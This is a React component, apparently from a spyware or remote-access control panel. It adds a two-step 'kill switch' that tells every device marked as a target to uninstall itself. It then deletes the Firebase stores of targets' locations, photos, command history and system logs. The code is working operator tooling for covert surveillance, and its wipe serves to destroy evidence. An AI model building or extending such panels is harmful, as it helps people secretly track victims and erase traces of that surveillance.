/**
 * Kill Switch Component - Emergency Self-Uninstall & Data Wipe
 * 2-Step Verification for security
 */

'use client';

import React, { useState } from 'react';
import { AlertTriangle, ShieldAlert, X, Terminal } from 'lucide-react';
import { Device } from '@/types';
import { ref, remove } from 'firebase/database';
import { database, FIREBASE_PATHS } from '@/lib/firebase';
import { useKillSwitch } from '@/hooks/useFirebase';
import { toast } from '@/lib/toast';

interface KillSwitchProps {
  devices: Device[];
}

export function KillSwitch({ devices }: KillSwitchProps) {
  const [step, setStep] = useState<0 | 1 | 2>(0);
  const [confirmText, setConfirmText] = useState('');
  const [isExecuting, setIsExecuting] = useState(false);
  const { mutate: sendKillCommand } = useKillSwitch();

  const handleFullWipe = async () => {
    if (confirmText !== 'ERASE_ALL_DATA') {
      toast.error('Konfirmasi teks salah');
      return;
    }

    setIsExecuting(true);
    try {
      const deviceIds = devices.map(d => d.id);
      sendKillCommand(deviceIds);

      await Promise.all([
        remove(ref(database, FIREBASE_PATHS.ACTIVE_TARGETS)),
        remove(ref(database, FIREBASE_PATHS.LOCATIONS)),
        remove(ref(database, FIREBASE_PATHS.SYSTEM_LOGS)),
        remove(ref(database, FIREBASE_PATHS.COMMANDS)),
        remove(ref(database, 'kei-vault/photos_list'))
      ]);

      toast.success('System Wipe Successful. All data erased.');
      window.location.reload();
    } catch (error) {
      toast.error('Wipe failed: ' + error);
    } finally {
      setIsExecuting(false);
      setStep(0);
    }
  };

  return (
    <>
      {/* ── Compact Kill Switch Button ── */}
      <button
        onClick={() => setStep(1)}
        className="inline-flex items-center gap-3 px-5 py-2.5 rounded-lg bg-red-500/[0.05] border border-red-500/20 text-red-500 text-[11px] font-bold hover:bg-red-500/10 hover:border-red-500/40 transition-all active:scale-[0.98] uppercase tracking-wider font-mono accent-glow"
      >
        <ShieldAlert size={14} />
        <span>Execute Kill Switch</span>
        <span className="opacity-40 text-[9px] ml-1">{devices.length} NODE(S)</span>
      </button>

      {/* ── Modal ── */}
      {step > 0 && (
        <div className="fixed inset-0 z-[100] flex items-center justify-center p-4 bg-[#010102]/95 backdrop-blur-md animate-fade-in-up">
          <div className="max-w-md w-full">
            <div className="bg-[#0f1011] border border-red-500/20 rounded-xl p-8 shadow-[0_0_50px_rgba(239,68,68,0.1)]">
              <div className="flex justify-between items-start mb-8">
                <div className="w-12 h-12 rounded-lg bg-red-500/10 flex items-center justify-center text-red-500 border border-red-500/20 accent-glow">
                  <AlertTriangle size={24} className="hacker-flicker" />
                </div>
                <button onClick={() => { setStep(0); setConfirmText(''); }} className="text-[#62666d] hover:text-[#f7f8f8] transition-colors p-2">
                  <X size={20} />
                </button>
              </div>

              {step === 1 ? (
                <div className="space-y-6">
                  <div>
                    <h2 className="text-2xl font-bold text-[#f7f8f8] mb-2 tracking-[-0.04em]">System Deletion Protocol</h2>
                    <p className="text-sm text-[#8a8f98] leading-relaxed">
                      Executing this command will transmit a self-destruct signal to all active nodes and purge the central Firebase repository.
                    </p>
                  </div>
                  <div className="p-4 rounded-lg bg-red-500/[0.04] border border-red-500/10">
                    <p className="text-[11px] text-red-400/90 font-mono tracking-tight uppercase">
                      CRITICAL: {devices.length} ACTIVE TARGETS WILL BE TERMINATED
                    </p>
                  </div>
                  <button
                    className="w-full py-4 bg-red-600 hover:bg-red-500 text-white rounded-lg font-bold text-xs uppercase tracking-[0.2em] transition-all accent-glow"
                    onClick={() => setStep(2)}
                  >
                    Authorize Termination
                  </button>
                </div>
              ) : (
                <div className="space-y-6">
                  <div>
                    <h2 className="text-2xl font-bold text-red-500 mb-2 tracking-[-0.04em]">Identity Verification</h2>
                    <p className="text-sm text-[#8a8f98] mb-6">
                      Type <code className="text-[#f7f8f8] bg-[#18191a] px-2 py-0.5 rounded border border-[#23252a] text-[11px] font-mono">ERASE_ALL_DATA</code> to confirm system wipe.
                    </p>
                    <div className="relative">
                      <Terminal className="absolute left-4 top-1/2 -translate-y-1/2 text-[#62666d]" size={16} />
                      <input
                        type="text"
                        className="w-full bg-[#010102] border border-[#23252a] rounded-lg py-4 pl-12 pr-4 text-[#f7f8f8] font-mono text-sm focus:border-red-500/50 outline-none transition-all placeholder:text-[#3e3e44]"
                        placeholder="PROTOCOL_KEY..."
                        value={confirmText}
                        onChange={(e) => setConfirmText(e.target.value)}
                        autoFocus
                      />
                    </div>
                  </div>
                  <div className="flex gap-4">
                    <button
                      className="flex-1 py-4 border border-[#23252a] text-[#8a8f98] rounded-lg text-xs font-bold uppercase tracking-widest hover:bg-[#141516] transition-all"
                      onClick={() => { setStep(0); setConfirmText(''); }}
                    >
                      Abort
                    </button>
                    <button
                      className="flex-1 py-4 bg-red-600 hover:bg-red-700 text-white rounded-lg text-xs font-bold uppercase tracking-widest transition-all disabled:opacity-20 disabled:cursor-not-allowed accent-glow"
                      disabled={confirmText !== 'ERASE_ALL_DATA' || isExecuting}
                      onClick={handleFullWipe}
                    >
                      {isExecuting ? 'WIPING...' : 'CONFIRM'}
                    </button>
                  </div>
                </div>
              )}
            </div>
          </div>
        </div>
      )}

    </>
  );
}
